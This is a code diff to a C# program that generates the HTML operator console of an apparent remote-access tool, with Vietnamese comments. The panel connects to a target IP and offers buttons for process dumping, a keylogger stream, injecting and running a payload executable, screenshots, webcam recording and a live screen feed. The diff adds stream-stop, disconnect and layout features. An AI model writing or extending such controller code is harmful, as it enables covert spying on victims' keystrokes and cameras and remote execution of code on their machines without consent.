@@ -20,6 +20,49 @@ namespace client
     <meta charset='UTF-8'>
     <title>UNKNOWN@UID:0000</title>
     <style>
+        .wrapper {
+            display: grid;
+            height: 100vh;
+            grid-template-columns: 180px calc(100vw - 360px) 180px;
+            grid-template-rows: 40px calc(100vh - 40px - 200px - 40px) 40px 200px !important;
+        }
+
+        /* ĐẶT FEED NÚT Ở HÀNG GRID SỐ 3 */
+        .surveillance-buttons {
+            grid-column: 2;
+            grid-row: 3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+
+        /* GIỮ ẢNH KHÔNG ĐÈ LÊN NÚT */
+        #visual-feed {
+            flex: 1;
+            border: 1px dashed var(--dim);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #050505;
+            overflow: hidden;
+        }
+
+        /* ĐẢM BẢO IMG/VIDEO KHÔNG PHÌNH QUÁ */
+        img, video {
+            width: 80%;
+            height: 800%;
+            object-fit: contain;
+            display: block;
+        }
+        #visual-feed img {
+            width: auto;
+            height: 100%;
+            max-width: 100%;
+            object-fit: contain;
+            display: block;
+        }
+
         /* --- THEME: DARK WEB / MYSTERIOUS --- */
         :root { 
             --bg: #020202; 
@@ -84,7 +127,7 @@ namespace client
         .danger-btn:hover { background: #300; color: red; }
 
         /* --- TERMINAL / LOGS --- */
-        .log-box { grid-column: 1 / -1; background: #000; border-top: 2px solid var(--dim); overflow: hidden; }
+        .log-box { grid-column: 1 / -1; background: #000; border-top: 2px solid var(--dim); overflow: hidden; height: 200px;}
         #terminal { 
             height: 100%; overflow-y: scroll; padding: 5px; font-size: 12px; color: #aaa; 
         }
@@ -123,10 +166,12 @@ namespace client
             <h3>>> UPLINK_CONFIG</h3>
             <input id='ip' value='127.0.0.1' placeholder='TARGET_IP'>
             <button onclick='connect()'>[ ESTABLISH UPLINK ]</button>
-
+            
             <h3 style='margin-top:20px'>>> EXPLOIT_TOOLS</h3>
             <button onclick=""send('LIST_APP')""> > DUMP PROCESSES</button>
             <button onclick=""send('KEYLOG')""> > KEYLOGGER STREAM</button>
+            <button onclick=""disconnectWS()"" class=""danger-btn"">[ DISCONNECT ]</button>
+
             <div style='margin-top:10px; border-top:1px dashed #333; padding-top:10px'>
                 <input id='appName' placeholder='payload.exe'>
                 <button onclick=""startApp()""> > INJECT / RUN</button>
@@ -141,6 +186,9 @@ namespace client
             <div style='display:flex; gap:5px; margin-top:5px'>
                 <button onclick=""send('SCREENSHOT')"">SNAP_SCREEN</button>
                 <button onclick=""send('WEBCAM')"">REC_CAM (10s)</button>
+
+                <button onclick=""stopStream()"" class=""danger-btn"">STOP STREAM</button>
+                <button onclick=""resumeStream()"" style=""border-color:#0a0; color:#0f0;"">RESUME</button>
             </div>
         </div>
 
@@ -166,6 +214,7 @@ namespace client
     </div>
 
     <script>
+        let streamEnabled = true;
         let ws;
         const term = document.getElementById('terminal');
 
@@ -181,6 +230,24 @@ namespace client
             </div>`;
             term.innerHTML += html;
             term.scrollTop = term.scrollHeight;
+        }
+        function stopStream() {
+            streamEnabled = false;
+            log(""Live stream stopped."", ""SYS"");
+        } 
+        function resumeStream() {
+            streamEnabled = true;
+            log(""Live stream resumed."", ""SYS"");
+        }
+        function disconnectWS() {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.close();
+                log(""Disconnected from server."", ""NET"");
+                document.getElementById(""status"").innerText = ""NO CARRIER"";
+                document.getElementById(""status"").style.color = ""#444"";
+            } else {
+                log(""No active connection to disconnect."", ""ERR"");
+            }
         }
 
         function connect() {
@@ -206,10 +273,16 @@ namespace client
                 
                 ws.onmessage = function(e) {
                     let d = e.data;
-                    if(d.startsWith('IMG|')) {
-                        document.getElementById('visual-feed').innerHTML = `<img src='data:image/jpeg;base64,${d.substring(4)}'>`;
-                        log('Image packet received (' + d.length + ' bytes).', 'DAT');
+                    if (d.startsWith(""LIVE|"")) {
+
+                        if (!streamEnabled) return; // ⭐ KHÔNG CẬP NHẬT NỮA ⭐
+
+                        let imgData = d.substring(5);
+                        document.getElementById('visual-feed').innerHTML =
+                            `<img src=""data:image/jpeg;base64,${imgData}"">`;
+                        return;
                     }
+
                     else if(d.startsWith('VID|')) {
                         document.getElementById('visual-feed').innerHTML = `<video controls autoplay loop src='data:video/avi;base64,${d.substring(4)}'></video>`;
                         log('Video stream buffer received.', 'DAT');
@@ -307,26 +380,13 @@ namespace client
         {
             try
             {
-                Process.Start("msedge.exe", "\"" + htmlPath + "\"");
+                Process.Start("msedge.exe", "--start-maximized \"" + htmlPath + "\"");
+
             }
             catch (Exception ex)
             {
                 MessageBox.Show("Error launching interface: " + ex.Message);
             }
         }
-
-        // --- CÁC HÀM "BỊT MIỆNG" LỖI DESIGNER (KHÔNG ĐƯỢC XÓA) ---
-        private void butApp_Click(object sender, EventArgs e) { }
-        private void butConnect_Click(object sender, EventArgs e) { }
-        private void button1_Click(object sender, EventArgs e) { }
-        private void butReg_Click(object sender, EventArgs e) { }
-        private void butKeyLock_Click(object sender, EventArgs e) { }
-        private void butPic_Click(object sender, EventArgs e) { }
-        private void butProcess_Click(object sender, EventArgs e) { }
-        private void butExit_Click(object sender, EventArgs e) { }
-        private void client_Closing(object sender, FormClosingEventArgs e) { }
-        private void txtIP_TextChanged(object sender, EventArgs e) { }
-        private void client_FormClosing(object sender, FormClosingEventArgs e) { }
-        private void client_Load(object sender, EventArgs e) { }
     }
 }
